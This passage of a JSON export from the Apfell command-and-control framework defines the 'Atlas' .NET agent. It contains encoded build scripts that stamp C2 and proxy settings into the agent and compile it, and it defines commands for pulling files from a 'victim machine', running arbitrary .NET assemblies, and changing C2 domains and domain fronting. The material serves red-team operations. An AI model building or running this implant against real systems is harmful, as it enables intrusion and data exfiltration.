          "code": "YXN5bmMgZGVmIGF0bGFzX3J1bmFzc2VtYmx5X3Nob3J0aGFuZChzZWxmLCB0YXNrX3BhcmFtczpzdHIsIHBhcmFtZXRlcjogTm9uZSkgLT4gc3RyOg0KICAgIGltcG9ydCBqc29uDQogICAgaWYgbGVuKHRhc2tfcGFyYW1zKSA9PSAwOg0KICAgICAgICByYWlzZSBFeGNlcHRpb24oIk1pc3NpbmcgcGFyYW1ldGVycyIpDQogICAgaWYgdGFza19wYXJhbXNbMF0gPT0gInsiOg0KICAgICAgICByZXR1cm4gdGFza19wYXJhbXMNCiAgICBwaWVjZXMgPSB0YXNrX3BhcmFtcy5zcGxpdCgiICIpDQogICAgdGFza19kaWN0ID0geyJhc3NlbWJseV9pZCI6IHBpZWNlc1swXSwgImFyZ3MiOiAiICIuam9pbihwaWVjZXNbMTpdKX0NCiAgICByZXR1cm4ganNvbi5kdW1wcyh0YXNrX2RpY3Qp",
          "name": "atlas_runassembly_shorthand",
          "parameter_type": "None",
          "description": "Swap out filename for needed file_id",
          "is_command_code": true,
          "timestamp": "04\/12\/2020 20:04:01",
          "id": 10,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIHNhdmVfcGFyYW1ldGVyKHNlbGYsIHByaW9yX291dHB1dDogTm9uZSwgcGFyYW1ldGVyOiBzdHIpIC0+IE5vbmU6CiAgICBzZWxmLnNhdmVkX2FycmF5LmFwcGVuZChwYXJhbWV0ZXIpCiAgICByZXR1cm4gTm9uZQ==",
          "name": "save_parameter",
          "parameter_type": "ChooseOne",
          "description": "Save a value as the next element in self.saved_array",
          "is_command_code": false,
          "timestamp": "04\/12\/2020 20:03:59",
          "id": 5,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIHNhdmVfc3RyaW5nX3BhcmFtZXRlcihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBOb25lOgogICAgc2VsZi5zYXZlZF9hcnJheS5hcHBlbmQocGFyYW1ldGVyKQogICAgcmV0dXJuIE5vbmU=",
          "name": "save_string_parameter",
          "parameter_type": "String",
          "description": "Save a string parameter to saved_array",
          "is_command_code": false,
          "timestamp": "04\/12\/2020 20:03:59",
          "id": 2,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX2NvbXBpbGVfYW5kX3JldHVybihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBieXRlYXJyYXk6DQogICAgdHJ5Og0KICAgICAgICBpZiBsZW4oc2VsZi5zYXZlZF9hcnJheSkgPCA3Og0KICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJJbmNvcnJlY3QgbnVtYmVyIG9mIHNhdmVkIGFyZ3VtZW50cyIpDQogICAgICAgIGFyY2ggPSBzZWxmLnNhdmVkX2FycmF5WzFdDQogICAgICAgIHByb2ZpbGUgPSBzZWxmLnNhdmVkX2FycmF5WzJdDQogICAgICAgIGlmIHNlbGYuc2F2ZWRfYXJyYXlbMF0gPT0gIjQuMCI6DQogICAgICAgICAgICBpZiBzZWxmLnNhdmVkX2FycmF5WzNdID09ICJ0cnVlIjoNCiAgICAgICAgICAgICAgICBjb21tYW5kID0gIi91c3IvYmluL21jcyAtdGFyZ2V0OndpbmV4ZSAtc2RrOjQgLXBsYXRmb3JtOnt9IC1kZWZpbmU6XCJUUkFDRSx7fSxORVRfNFwiIC1vcHRpbWl6ZSsgLW91dDpBdGxhcy5leGUgQ29uZmlnLmNzICBDcnlwdG8uY3MgIEh0dHBfNC4wLmNzIE1vZHVsZXMuY3MgIFByb2dyYW0uY3MgVXRpbHMuY3MiLmZvcm1hdChhcmNoLCBwcm9maWxlKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBjb21tYW5kID0gIi91c3IvYmluL21jcyAtdGFyZ2V0OndpbmV4ZSAtc2RrOjQgLXBsYXRmb3JtOnt9IC1kZWZpbmU6XCJUUkFDRSx7fSxORVRfNCxDRVJUX0ZBTFNFXCIgLW9wdGltaXplKyAtb3V0OkF0bGFzLmV4ZSBDb25maWcuY3MgIENyeXB0by5jcyAgSHR0cF80LjAuY3MgTW9kdWxlcy5jcyAgUHJvZ3JhbS5jcyBVdGlscy5jcyIuZm9ybWF0KGFyY2gsIHByb2ZpbGUpDQogICAgICAgIGVsaWYgc2VsZi5zYXZlZF9hcnJheVswXSA9PSAiMy41IjoNCiAgICAgICAgICAgIGlmIHNlbGYuc2F2ZWRfYXJyYXlbM10gPT0gInRydWUiOg0KICAgICAgICAgICAgICAgIGNvbW1hbmQgPSAiL3Vzci9iaW4vZ21jcyAvbm9jb25maWcgL2RlYnVnLSAvb3B0aW1pemUrIC9vdXQ6QXRsYXMuZXhlIENvbmZpZy5jcyBDcnlwdG8uY3MgSHR0cF8zLjUuY3MgTW9kdWxlcy5jcyBQcm9ncmFtLmNzIFV0aWxzLmNzIC90YXJnZXQ6d2luZXhlIC9kZWZpbmU6VFJBQ0Use30gL3BsYXRmb3JtOnt9IC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLmRsbCAvcmVmZXJlbmNlOi91c3IvbGliL21vbm8vMi4wL1N5c3RlbS5YbWwuTGlucS5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uRGF0YS5EYXRhU2V0RXh0ZW5zaW9ucy5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vL2dhYy9NaWNyb3NvZnQuQ1NoYXJwLzQuMC4wLjBfX2IwM2Y1ZjdmMTFkNTBhM2EvTWljcm9zb2Z0LkNTaGFycC5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uRGF0YS5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uWG1sLmRsbCAvcmVmZXJlbmNlOi91c3IvbGliL21vbm8vMi4wL1N5c3RlbS5Db3JlLmRsbCAvd2Fybjo0Ii5mb3JtYXQocHJvZmlsZSwgYXJjaCkNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgY29tbWFuZCA9ICIvdXNyL2Jpbi9nbWNzIC9ub2NvbmZpZyAvZGVidWctIC9vcHRpbWl6ZSsgL291dDpBdGxhcy5leGUgQ29uZmlnLmNzIENyeXB0by5jcyBIdHRwXzMuNS5jcyBNb2R1bGVzLmNzIFByb2dyYW0uY3MgVXRpbHMuY3MgL3RhcmdldDp3aW5leGUgL2RlZmluZTpUUkFDRSx7fSxDRVJUX0ZBTFNFIC9wbGF0Zm9ybTp7fSAvcmVmZXJlbmNlOi91c3IvbGliL21vbm8vMi4wL1N5c3RlbS5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uWG1sLkxpbnEuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLkRhdGEuRGF0YVNldEV4dGVuc2lvbnMuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby9nYWMvTWljcm9zb2Z0LkNTaGFycC80LjAuMC4wX19iMDNmNWY3ZjExZDUwYTNhL01pY3Jvc29mdC5DU2hhcnAuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLkRhdGEuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLlhtbC5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uQ29yZS5kbGwgL3dhcm46NCIuZm9ybWF0KHByb2ZpbGUsIGFyY2gpDQogICAgICAgIHByb2MgPSBhd2FpdCBhc3luY2lvLmNyZWF0ZV9zdWJwcm9jZXNzX3NoZWxsKGNvbW1hbmQsIHN0ZG91dD1hc3luY2lvLnN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRlcnI9YXN5bmNpby5zdWJwcm9jZXNzLlBJUEUsIGN3ZD1zZWxmLndvcmtpbmdfZGlyKQ0KICAgICAgICBzdGRvdXQsIHN0ZGVyciA9IGF3YWl0IHByb2MuY29tbXVuaWNhdGUoKQ0KICAgICAgICBpZiBzdGRvdXQ6DQogICAgICAgICAgICBwcmludChmJ1tzdGRvdXRdXG57c3Rkb3V0LmRlY29kZSgpfScpDQogICAgICAgIGlmIHN0ZGVycjoNCiAgICAgICAgICAgIHByaW50KGYnW3N0ZGVycl1cbntzdGRlcnIuZGVjb2RlKCl9JykNCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoInt9L0F0bGFzLmV4ZSIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpKToNCiAgICAgICAgICAgIHJldHVybiBieXRlYXJyYXkob3Blbigie30vQXRsYXMuZXhlIi5mb3JtYXQoc2VsZi53b3JraW5nX2RpciksICdyYicpLnJlYWQoKSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgICMgc29tZXRoaW5nIHdlbnQgd3JvbmcsIHJldHVybiBvdXIgZXJyb3JzDQogICAgICAgICAgICByYWlzZSBFeGNlcHRpb24oc3RkZXJyLmRlY29kZSgpKQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKHN0ZGVyci5kZWNvZGUoKSArIHN0ZG91dC5kZWNvZGUoKSk=",
          "name": "atlas_compile_and_return",
          "parameter_type": "None",
          "description": "Compile atlas payload",
          "is_command_code": false,
          "timestamp": "04\/12\/2020 20:04:01",
          "id": 12,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX3N0YW1wX3BhcmFtZXRlcnMoc2VsZiwgcHJpb3Jfb3V0cHV0OiBOb25lLCBwYXJhbWV0ZXI6IHN0cikgLT4gYnl0ZWFycmF5OgogICAgaWYgbGVuKHNlbGYuc2F2ZWRfYXJyYXkpIDwgNzoKICAgICAgICByYWlzZSBFeGNlcHRpb24oIkluY29ycmVjdCBudW1iZXIgb2Ygc2F2ZWQgYXJndW1lbnRzIikKICAgIHV1aWQgPSBvcGVuKCJ7fS9VdWlkLnR4dCIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpLCAncicpLnJlYWQoKQogICAgZmlsZTEgPSBvcGVuKCJ7fS9Db25maWdfdGVtcC5jcyIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpLCAncicpLnJlYWQoKQogICAgZmlsZTIgPSBvcGVuKCJ7fS9Db25maWcuY3MiLmZvcm1hdChzZWxmLndvcmtpbmdfZGlyKSwgJ3cnKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCIlVVVJRCUiLCB1dWlkLnN0cmlwKCkpCiAgICBpZiBzZWxmLnNhdmVkX2FycmF5WzRdIGlzIG5vdCBOb25lIGFuZCBzZWxmLnNhdmVkX2FycmF5WzRdIGlzIG5vdCAiIjoKICAgICAgICBmaWxlMSA9IGZpbGUxLnJlcGxhY2UoJyVQQVJBTSUnLCBzZWxmLnNhdmVkX2FycmF5WzRdKQogICAgZWxzZToKICAgICAgICBmaWxlMSA9IGZpbGUxLnJlcGxhY2UoJyVQQVJBTSUnLCAnaWQnKQogICAgaWYgc2VsZi5zYXZlZF9hcnJheVs1XSBpcyBub3QgTm9uZSBhbmQgc2VsZi5zYXZlZF9hcnJheVs1XSBpcyBub3QgIiI6CiAgICAgICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclQ0hVTktfU0laRSUnLCBzZWxmLnNhdmVkX2FycmF5WzVdKQogICAgZWxzZToKICAgICAgICBmaWxlMSA9IGZpbGUxLnJlcGxhY2UoJyVDSFVOS19TSVpFJScsIHN0cig1MTIwMDApKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclREVGQVVMVF9QUk9YWSUnLCBzZWxmLnNhdmVkX2FycmF5WzZdKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclUFJPWFlfQUREUkVTUyUnLCBzZWxmLnNhdmVkX2FycmF5WzddKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclUFJPWFlfVVNFUiUnLCBzZWxmLnNhdmVkX2FycmF5WzhdKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclUFJPWFlfUEFTU1dPUkQlJywgc2VsZi5zYXZlZF9hcnJheVs5XSkKICAgIGZpbGUyLndyaXRlKGZpbGUxKQogICAgZmlsZTIuY2xvc2UoKQ==",
          "name": "atlas_stamp_parameters",
          "parameter_type": "None",
          "description": "Stamp in parameters for Atlas payload",
          "is_command_code": false,
          "timestamp": "04\/12\/2020 20:04:01",
          "id": 11,
          "operator": "apfell_admin"
        }
      ],
      "commands": [
        {
          "needs_admin": false,
          "help_cmd": "upload {\"assembly_id\": 65, \"remote_path\": \"path to file\"}",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Take a file from the database and store it on disk through the callback.",
          "cmd": "upload",
          "parameters": [
            {
              "type": "File",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "assembly_id"
            },
            {
              "type": "String",
              "hint": "Path to save the remote file too (default is current directory)",
              "choices": "",
              "required": true,
              "name": "remote_path"
            }
          ],
          "attack": [
            {
              "t_num": "T1132",
              "attack_name": "Data Encoding"
            },
            {
              "t_num": "T1030",
              "attack_name": "Data Transfer Size Limits"
            },
            {
              "t_num": "T1041",
              "attack_name": "Exfiltration Over Command and Control Channel"
            }
          ],
          "artifacts": [],
          "files": [],
          "transforms": [
            {
              "order": 2,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "04\/12\/2020 20:04:01",
              "command": "upload",
              "command_id": 42,
              "payload_type": "atlas",
              "transform": "swap_shortnames",
              "parameter_type": "None"
            },
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "04\/12\/2020 20:04:01",
              "command": "upload",
              "command_id": 42,
              "payload_type": "atlas",
              "transform": "atlas_upload_shorthand",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "download [path to remote file]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": true,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Download a file from the victim machine to the apfell server in chunks (no need for quotes in the path). It will be saved to app\/files\/{operation name}\/downloads\/{hostname}\/{filename}",
          "cmd": "download",
          "parameters": [
            {
              "type": "String",
              "hint": "Path to remote file to be downloaded",
              "choices": "",
              "required": true,
              "name": "file_path"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "loadassembly [assembly filename]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Load an arbitrary .NET assembly via Assembly.Load and track the assembly FullName to call for execution with the runassembly command. If assembly is loaded through Apfell's services -> host file, then operators can simply specify the filename from the uploaded file",
          "cmd": "loadassembly",
          "parameters": [
            {
              "type": "File",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "assembly_id"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": [
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "04\/12\/2020 20:04:01",
              "command": "loadassembly",
              "command_id": 44,
              "payload_type": "atlas",
              "transform": "atlas_loadassembly_shorthand",
              "parameter_type": "None"
            },
            {
              "order": 2,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "04\/12\/2020 20:04:01",
              "command": "loadassembly",
              "command_id": 44,
              "payload_type": "atlas",
              "transform": "swap_shortnames",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "jobkill [job id]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Kills a running job and removes it from the atlas instance's list of running jobs.",
          "cmd": "jobkill",
          "parameters": [
            {
              "type": "String",
              "hint": "The Job Id for the running job to be killed",
              "choices": "",
              "required": true,
              "name": "job_id"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "exit",
          "version": 1,
          "is_exit": true,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This exits the current atlas instance by leveraging the Environment.Exit class method.",
          "cmd": "exit",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "runassembly [filename] [assembly arguments]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Execute the entrypoint of a assembly loaded by the loadassembly command and redirect the console output back to the Apfell server.",
          "cmd": "runassembly",
          "parameters": [
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "assembly_id"
            },
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "args"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": [
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "04\/12\/2020 20:04:01",
              "command": "runassembly",
              "command_id": 47,
              "payload_type": "atlas",
              "transform": "atlas_runassembly_shorthand",
              "parameter_type": "None"
            },
            {
              "order": 2,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "04\/12\/2020 20:04:01",
              "command": "runassembly",
              "command_id": 47,
              "payload_type": "atlas",
              "transform": "swap_shortnames",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "listloaded",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Retrieve a list of .NET assemblies loaded via the loadassembly command. ",
          "cmd": "listloaded",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "jobs",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Retrieve a list of currently running jobs",
          "cmd": "jobs",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "config [info | domain | sleep | jitter | host_header | user_agent | param | proxy] [add | remove | use_default | address | username | password] [options]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "config\t\t\t\tbase command\noptions:\ninfo\t\t\t\tdisplay current agent configuration\ndomain\t\t\t\toption to add\/remove C2 domain\n\tadd\t\t\t\tadd a C2 domain to list of domains\n\tremove\t\t\tremove a C2 domain from list of domains (will not let list be less then one domain)\nsleep\t\t\t\tsleep time between taskings in seconds\njitter\t\t\t\tvariation in sleep time, specify as a percentage\nkill_date\t\t\tdate for agent to exit itself\nhost_header\t\t\thost header to use for domain fronting\nuser_agent\t\t\tuser-agent header for web requests\nparam\t\t\t\toption for query parameter used in GET requests\nproxy\t\t\t\toption to modify proxy settings\n\tuse_default\t\ttrue\/false, choose whether to use system default settings or manual settings specified in config\n\taddress\t\t\taddress of proxy server\n\tusername\t\tusername to authenticate to proxy server\n\tpassword\t\tpassword to authenticate to proxy server\nExamples:\nconfig info\nconfig domain add http:\/\/hello.world\nconfig sleep 60\nconfig jitter 20\nconfig kill_date 2020-03-01\nconfig host_header cdn.cloudfront.com\nconfig user_agent Mozilla 5.0 IE blah blah blah\nconfig param order\nconfig proxy use_default false\nconfig proxy address 192.168.1.100\nconfig proxy username harm.j0y\nconfig proxy password Liv3F0rTh3Tw!ts",
          "cmd": "config",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "pwd",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Get current working directory of Atlas instance.",
          "cmd": "pwd",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "cd [C:\\path\\to\\cahnge\\to]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Change current working directory of Atlas instance.",
          "cmd": "cd",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "rm [filename]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Delete the specified file.",
          "cmd": "rm",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "ps",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": true,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Gather list of running processes.",
          "cmd": "ps",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2UpewogIHZhciByb3dzID0gW107CiAgZm9yKHZhciBpID0gMDsgaSA8IHJlc3BvbnNlLmxlbmd0aDsgaSsrKXsKICAgIHRyeXsKICAgICAgICB2YXIgZGF0YSA9IEpTT04ucGFyc2UocmVzcG9uc2VbaV1bJ3Jlc3BvbnNlJ10pOwogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4gcmVzcG9uc2U7CiAgICB9CiAgIHZhciByb3dfc3R5bGUgPSAiIjsKICAgdmFyIGNlbGxfc3R5bGUgPSB7ImhpZGRlbiI6ICJ0ZXh0LWFsaWduOmNlbnRlciIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidHlwZSI6InRleHQtYWxpZ246Y2VudGVyIn07CiAgICAKICAgIGRhdGEuZm9yRWFjaChmdW5jdGlvbihyKXsKICAgICAgdmFyIHJvd19zdHlsZSA9ICIiOwogICAgICByb3dzLnB1c2goeyJwcm9jZXNzX2lkIjogclsncHJvY2Vzc19pZCddLAogICAgICAgICAgICAgICAgICAgICAgICAgICJwYXJlbnRfcHJvY2Vzc19pZCI6IHJbJ3BhcmVudF9wcm9jZXNzX2lkJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgInBhdGgiOiByWydiaW5fcGF0aCddLAogICAgICAgICAgICAgICAgICAgICAgICAgICJ1c2VyIjogclsndXNlciddLAogICAgICAgICAgICAgICAgICAgICAgICAgICJyb3ctc3R5bGUiOiByb3dfc3R5bGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICJjZWxsLXN0eWxlIjoge30KICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgfSk7CiAgfQogIHZhciBvdXRwdXQgPSBzdXBwb3J0X3NjcmlwdHNbJ2NyZWF0ZV90YWJsZSddKFt7Im5hbWUiOiJwcm9jZXNzX2lkIiwgInNpemUiOiIxMGVtIn0seyJuYW1lIjoicGFyZW50X3Byb2Nlc3NfaWQiLCAic2l6ZSI6IjEwZW0ifSwgeyJuYW1lIjogInVzZXIiLCAic2l6ZSI6ICIxMGVtIn0seyJuYW1lIjoicGF0aCIsICJzaXplIjoiIn1dLCByb3dzKTsKICByZXR1cm4gb3V0cHV0Owp9"
        },
        {
          "needs_admin": false,
          "help_cmd": "ls [path]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": true,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "List contents of specified directory.",
          "cmd": "ls",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2UpewogIHZhciByb3dzID0gW107CiAgZm9yKHZhciBpID0gMDsgaSA8IHJlc3BvbnNlLmxlbmd0aDsgaSsrKXsKICAgIHRyeXsKICAgICAgICB2YXIgZGF0YSA9IEpTT04ucGFyc2UocmVzcG9uc2VbaV1bJ3Jlc3BvbnNlJ10pOwogICAgfWNhdGNoKGVycm9yKXsKICAgIAkvL3JldHVybiBlcnJvci5Ub1N0cmluZygpOwogICAgICAgIHJldHVybiByZXNwb25zZTsKICAgIH0KICAgdmFyIHJvd19zdHlsZSA9ICIiOwogICB2YXIgY2VsbF9zdHlsZSA9IHsiaGlkZGVuIjogInRleHQtYWxpZ246Y2VudGVyIiwgInR5cGUiOiJ0ZXh0LWFsaWduOmNlbnRlciJ9OwogICAgCiAgICBkYXRhLmZvckVhY2goZnVuY3Rpb24ocil7CiAgICAgIHZhciByb3dfc3R5bGUgPSAiIjsKICAgICAgaWYgKHJbIklzRGlyIl0pIHsgcm93X3N0eWxlID0gImJhY2tncm91bmQtY29sb3I6ICM1RTI4REMiOyB9CiAgICAgIHJvd3MucHVzaCh7IkZpbGVuYW1lIjogclsnZmlsZV9uYW1lJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgIlNpemUiOiByWydzaXplJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgIkxhc3Rtb2RpZmllZCI6IHJbJ3RpbWVzdGFtcCddLAogICAgICAgICAgICAgICAgICAgICAgICAgICJJc0RpciI6IHJbJ0lzRGlyJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICJyb3ctc3R5bGUiOiByb3dfc3R5bGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICJjZWxsLXN0eWxlIjoge30KICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgfSk7CiAgfQogdmFyIG91dHB1dCA9IHN1cHBvcnRfc2NyaXB0c1snY3JlYXRlX3RhYmxlJ10oW3sibmFtZSI6IkZpbGVuYW1lIiwgInNpemUiOiIxMGVtIn0seyJuYW1lIjoiU2l6ZSIsICJzaXplIjoiMmVtIn0seyJuYW1lIjoiTGFzdG1vZGlmaWVkIiwic2l6ZSI6IjNlbSJ9ICx7Im5hbWUiOiAiSXNEaXIiLCAic2l6ZSI6ICIyZW0ifV0sIHJvd3MpOwogIHJldHVybiBvdXRwdXQ7Cn0="
        }
      ]
    }
  ]
}
